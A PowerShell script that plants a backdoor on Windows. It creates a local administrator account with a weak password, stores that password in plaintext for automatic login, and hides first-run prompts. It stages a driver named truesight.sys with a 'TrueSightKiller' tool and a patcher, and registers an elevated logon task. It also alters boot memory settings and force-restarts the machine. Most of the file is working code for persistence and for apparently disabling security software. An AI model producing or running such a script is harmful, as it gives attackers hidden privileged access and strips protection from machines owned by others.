# CreateAndAutoLogin.ps1

bcdedit /set {current} removememory 8192

./DMR_SPD_Tool_Headless.exe

# Must be run as Administrator
param(
    [string]$NewUsername = "AutoTomBot",
    [string]$NewPassword = "Password1",
    [string]$FullName    = "Absolutely NOT a malicious account"
)

# --- 1. Create the local account ---
Write-Host "Creating user account $NewUsername..."
$securePass = ConvertTo-SecureString $NewPassword -AsPlainText -Force
New-LocalUser `
    -Name        $NewUsername `
    -Password    $securePass `
    -FullName    $FullName `
    -Description "Auto-created auto-login account" `
    -PasswordNeverExpires `
    -ErrorAction Stop

Add-LocalGroupMember -Group "Administrators" -Member $NewUsername
Write-Host "Account created and added to Administrators group."

# --- 2. Configure auto-login via registry ---
Write-Host "Configuring automatic login..."
$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
Set-ItemProperty -Path $regPath -Name "AutoAdminLogon"    -Value "1"             -Type String
Set-ItemProperty -Path $regPath -Name "DefaultUserName"   -Value $NewUsername    -Type String
Set-ItemProperty -Path $regPath -Name "DefaultPassword"   -Value $NewPassword    -Type String
Set-ItemProperty -Path $regPath -Name "DefaultDomainName" -Value $env:COMPUTERNAME -Type String
Write-Host "Auto-login configured."

# --- 3. Suppress first-run experience (HKLM keys, apply to all users) ---
$path1 = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
Set-ItemProperty -Path $path1 -Name "EnableFirstLogonAnimation" -Value 0 -Type DWord

$path2 = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\OOBE"
If (!(Test-Path $path2)) { New-Item -Path $path2 -Force }
Set-ItemProperty -Path $path2 -Name "DisablePrivacyExperience" -Value 1 -Type DWord

# --- 4. Pre-create the user profile folder and copy startup script ---
Write-Host "Pre-creating user profile..."
$cred = New-Object System.Management.Automation.PSCredential($NewUsername, $securePass)

# Use a local working directory to avoid OneDrive path issue
Start-Process "cmd.exe" -ArgumentList "/c exit" -Credential $cred -Wait -WorkingDirectory "C:\Windows\System32"

# Copy the bat to a permanent location
$scriptDest = "C:\Scripts"
If (!(Test-Path "C:\Scripts")) { New-Item -Path "C:\Scripts" -ItemType Directory -Force }
Copy-Item "$PSScriptRoot\runme.bat" $scriptDest\runme2.bat
Copy-Item "$PSScriptRoot\helper.exe" $scriptDest\helper.exe
Copy-Item "$PSScriptRoot\truesight.sys" $scriptDest\truesight.sys
Copy-Item "$PSScriptRoot\TrueSightKiller.exe" $scriptDest\TrueSightKiller.exe
Copy-Item "$PSScriptRoot\patcher_camera_ready.exe" $scriptDest\patcher_camera_ready.exe

# Register it as an elevated scheduled task for the new user
$Action = New-ScheduledTaskAction -Execute "cmd.exe" `
    -Argument "/c `"$scriptDest\runme.bat`""

$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $NewUsername

$Principal = New-ScheduledTaskPrincipal -UserId $NewUsername `
    -LogonType Interactive `
    -RunLevel Highest

$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries

Register-ScheduledTask -TaskName "StartupBat_$NewUsername" `
    -Action $Action `
    -Trigger $Trigger `
    -Principal $Principal `
    -Settings $Settings `
    -Force

Write-Host "Startup task registered to run as admin silently."

# Load the new user's registry hive and map it as a PS drive
reg load "HKU\TempUser" "C:\Users\$NewUsername\NTUSER.DAT"
New-PSDrive -Name "HKU" -PSProvider Registry -Root "HKEY_USERS" | Out-Null

$path3 = "HKU:\TempUser\Software\Microsoft\Windows\CurrentVersion\UserProfileEngagement"
If (!(Test-Path $path3)) { New-Item -Path $path3 -Force }
New-ItemProperty -Path $path3 -Name "ScoobeSystemSettingEnabled" -Value 0 -PropertyType DWord -Force

[gc]::Collect()
reg unload "HKU\TempUser"
Write-Host "Startup script copied and privacy settings configured."


# --- 5. Restart ---
Write-Host "Restarting in 3 seconds... Press Ctrl+C to cancel."
Start-Sleep -Seconds 3
Restart-Computer -Force